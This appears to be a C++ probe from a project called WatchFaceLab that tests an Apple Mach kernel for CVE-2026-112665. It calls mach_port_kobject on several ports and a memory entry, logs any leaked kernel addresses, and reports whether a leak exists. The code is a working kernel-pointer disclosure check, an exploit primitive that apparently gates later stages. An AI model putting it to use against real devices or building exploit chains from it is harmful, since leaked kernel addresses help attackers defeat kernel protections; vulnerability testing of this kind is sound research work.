#include "WatchFaceLab/CVE112665Probe.h"

#include <mach/mach.h>
#include <mach/mach_port.h>
#include <mach_debug/ipc_info.h>
#include <stdint.h>
#include <stdio.h>

volatile int32_t cve_2026_112665_task_result = INT32_MIN;
volatile int32_t cve_2026_112665_host_result = INT32_MIN;
volatile int32_t cve_2026_112665_thread_result = INT32_MIN;
volatile int32_t cve_2026_112665_receive_result = INT32_MIN;
volatile int32_t cve_2026_112665_entry_result = INT32_MIN;
volatile uint64_t cve_2026_112665_task_address = 0;
volatile uint64_t cve_2026_112665_host_address = 0;
volatile uint64_t cve_2026_112665_thread_address = 0;
volatile uint64_t cve_2026_112665_receive_address = 0;
volatile uint64_t cve_2026_112665_entry_address = 0;
volatile uint32_t cve_2026_112665_kernel_address_bits = 0;

enum : uint32_t {
    KERNEL_ADDRESS_TASK = 1U << 0,
    KERNEL_ADDRESS_HOST = 1U << 1,
    KERNEL_ADDRESS_THREAD = 1U << 2,
    KERNEL_ADDRESS_RECEIVE = 1U << 3,
    KERNEL_ADDRESS_ENTRY = 1U << 4,
};

static bool
is_canonical_kernel_address(mach_vm_address_t address)
{
    return (address & UINT64_C(0xffff000000000000)) ==
            UINT64_C(0xffff000000000000) &&
           address != UINT64_MAX;
}

static void
inspect_port(
    const char *label,
    mach_port_name_t name,
    volatile int32_t *result,
    volatile uint64_t *address_snapshot,
    uint32_t address_bit)
{
    ipc_info_object_type_t object_type = IPC_OTYPE_NONE;
    mach_vm_address_t object_address = 0;
    kern_return_t kr = mach_port_kobject(
        mach_task_self(), name, &object_type, &object_address);

    *result = kr;
    *address_snapshot = object_address;
    if (kr == KERN_SUCCESS && is_canonical_kernel_address(object_address)) {
        cve_2026_112665_kernel_address_bits |= address_bit;
    }

    printf("[CVE-2026-112665 gate] %s kr=0x%x type=%u "
           "address=0x%llx canonical=%u\n",
           label,
           kr,
           static_cast<unsigned>(object_type),
           static_cast<unsigned long long>(object_address),
           (kr == KERN_SUCCESS && is_canonical_kernel_address(object_address))
               ? 1U
               : 0U);
}

extern "C" int32_t
cve_2026_112665_probe_run(void)
{
    cve_2026_112665_task_result = INT32_MIN;
    cve_2026_112665_host_result = INT32_MIN;
    cve_2026_112665_thread_result = INT32_MIN;
    cve_2026_112665_receive_result = INT32_MIN;
    cve_2026_112665_entry_result = INT32_MIN;
    cve_2026_112665_task_address = 0;
    cve_2026_112665_host_address = 0;
    cve_2026_112665_thread_address = 0;
    cve_2026_112665_receive_address = 0;
    cve_2026_112665_entry_address = 0;
    cve_2026_112665_kernel_address_bits = 0;

    inspect_port(
        "task",
        mach_task_self(),
        &cve_2026_112665_task_result,
        &cve_2026_112665_task_address,
        KERNEL_ADDRESS_TASK);

    mach_port_t host = mach_host_self();
    inspect_port(
        "host",
        host,
        &cve_2026_112665_host_result,
        &cve_2026_112665_host_address,
        KERNEL_ADDRESS_HOST);
    (void)mach_port_deallocate(mach_task_self(), host);

    mach_port_t thread = mach_thread_self();
    inspect_port(
        "thread",
        thread,
        &cve_2026_112665_thread_result,
        &cve_2026_112665_thread_address,
        KERNEL_ADDRESS_THREAD);
    (void)mach_port_deallocate(mach_task_self(), thread);

    mach_port_t receive = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(
        mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &receive);
    if (kr == KERN_SUCCESS) {
        inspect_port(
            "receive",
            receive,
            &cve_2026_112665_receive_result,
            &cve_2026_112665_receive_address,
            KERNEL_ADDRESS_RECEIVE);
        (void)mach_port_mod_refs(
            mach_task_self(), receive, MACH_PORT_RIGHT_RECEIVE, -1);
    } else {
        cve_2026_112665_receive_result = kr;
    }

    vm_address_t allocation = 0;
    kr = vm_allocate(
        mach_task_self(), &allocation, vm_page_size, VM_FLAGS_ANYWHERE);
    if (kr == KERN_SUCCESS) {
        memory_object_size_t entry_size = vm_page_size;
        mach_port_t entry = MACH_PORT_NULL;
        kr = mach_make_memory_entry_64(
            mach_task_self(),
            &entry_size,
            allocation,
            VM_PROT_READ | VM_PROT_WRITE | VM_PROT_IS_MASK,
            &entry,
            MACH_PORT_NULL);
        if (kr == KERN_SUCCESS && entry != MACH_PORT_NULL) {
            inspect_port(
                "named-entry",
                entry,
                &cve_2026_112665_entry_result,
                &cve_2026_112665_entry_address,
                KERNEL_ADDRESS_ENTRY);
            (void)mach_port_deallocate(mach_task_self(), entry);
        } else {
            cve_2026_112665_entry_result = kr;
        }
        (void)vm_deallocate(mach_task_self(), allocation, vm_page_size);
    } else {
        cve_2026_112665_entry_result = kr;
    }

    printf("[CVE-2026-112665 gate] kernel-address-bits=0x%x\n",
           cve_2026_112665_kernel_address_bits);
    return cve_2026_112665_kernel_address_bits != 0 ? 0 : 1;
}
